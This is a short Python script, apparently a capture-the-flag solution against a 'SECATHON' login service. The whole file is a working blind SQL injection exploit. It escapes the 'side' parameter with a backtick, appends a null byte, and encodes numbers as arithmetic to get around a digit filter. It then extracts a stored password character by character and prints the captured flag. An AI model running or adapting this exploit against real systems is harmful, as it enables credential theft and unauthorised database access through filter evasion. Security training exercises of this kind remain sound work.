import requests
import string
import re
import sys

target  = 'http://172.16.120.5:8082/login?username={}&password={}&side={}'
charset = string.digits + 'abcdef'

def login(username, password, side):
	final_url = target.format(username, password, side)
	content = requests.get(final_url).content
	if 'SECATHON' in content:
		print re.search("SECATHON{(.*?)}", content).group(0)
		sys.exit(0)

def cast(value):
	i = value
	while True:
		check = True
		for c in str(i):
			if c in '1235':
				check = False
				break
		if check:
			return '('+str(i)+'-(9-8)'*(i-value)+')'
		i = i + 1


if __name__ == "__main__":
	for i in range(64):
		for c in charset:
			side = "Lightside` JOIN sqlite_master ON %s<unicode(substr(password,%s,9-8)) and unicode(substr(password,%s,9-8))<%s-- -\x00" % (cast(ord(c)-1), cast(i+1), cast(i+1), cast(ord(c)+1))
			login("stormtrooper", "stormtrooper", side)